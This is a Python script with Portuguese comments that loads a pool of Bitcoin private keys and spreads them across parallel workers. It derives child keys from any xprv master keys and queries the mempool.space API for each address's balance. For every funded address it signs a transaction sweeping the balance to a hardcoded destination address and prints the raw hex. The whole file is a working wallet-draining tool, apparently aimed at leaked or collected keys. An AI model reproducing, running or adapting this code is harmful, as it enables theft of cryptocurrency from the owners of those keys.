import os, requests, time, sys
try:
    from bitcoinlib.keys import Key
    from bitcoinlib.transactions import Transaction
except ImportError:
    print("❌ Erro: Biblioteca 'bitcoinlib' não instalada corretamente!")
    sys.exit(1)

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 20))

def create_raw_tx(wif, balance_sats):
    try:
        k = Key(wif, network='bitcoin')
        fee = 3500 
        amount = balance_sats - fee
        if amount <= 546: return None
        t = Transaction(network='bitcoin')
        t.add_input(k.address(), balance_sats)
        t.add_output(DEST_ADDRESS, amount)
        t.sign(k)
        return t.raw_hex()
    except Exception as e:
        print(f"❌ Erro ao criar TX: {e}")
        return None

def check_key(priv_key):
    try:
        priv_key = priv_key.strip()
        if not priv_key: return
        
        # --- DEEP SCAN (xprv) ---
        if priv_key.startswith('xprv'):
            print(f"📦 W{WORKER_ID} | Derivando Master Key...")
            master = Key(priv_key)
            for i in range(100): 
                check_key(master.subkey_for_path(f"0/{i}").wif())
            return

        # --- VARREDURA DE ENDEREÇOS ---
        k = Key(priv_key, network='bitcoin')
        # Testa os 3 formatos: Legacy, P2SH-SegWit, Native SegWit
        for w_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=w_type)
            
            # O print com flush=True força o log a aparecer no GitHub imediatamente
            print(f"🔎 W{WORKER_ID} | {addr}", flush=True)
            
            try:
                # API do Mempool.space
                r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    stats = data.get('chain_stats', {})
                    bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                    
                    if bal > 0:
                        print(f"\n🚨 !!! SALDO DETECTADO !!!\nEndereço: {addr} | Valor: {bal} sats", flush=True)
                        raw_hex = create_raw_tx(k.wif(), bal)
                        if raw_hex:
                            print(f"HEX_GEN:{raw_hex}", flush=True)
                elif r.status_code == 429:
                    print("⚠️ Rate Limit atingido! Aguardando 10 segundos...")
                    time.sleep(10)
            except Exception as e:
                print(f"⚠️ Erro na API para {addr}: {e}")
            
            # Delay necessário para não ser bloqueado pela API
            time.sleep(0.2)
            
    except Exception as e:
        # Se houver erro na chave (formato inválido), apenas ignora
        pass

if __name__ == "__main__":
    print(f"🚀 Iniciando Engine Worker {WORKER_ID}...", flush=True)
    
    if os.path.exists('MASTER_POOL.txt'):
        with open('MASTER_POOL.txt', 'r') as f:
            all_keys = f.readlines()
        
        # Sharding: Divide a lista entre os 20 workers
        my_keys = [all_keys[i] for i in range(len(all_keys)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
        
        print(f"✅ Pool carregado: {len(my_keys)} chaves para este worker.", flush=True)
        
        for key in my_keys:
            check_key(key)
    else:
        print("❌ Arquivo MASTER_POOL.txt não encontrado!", flush=True)
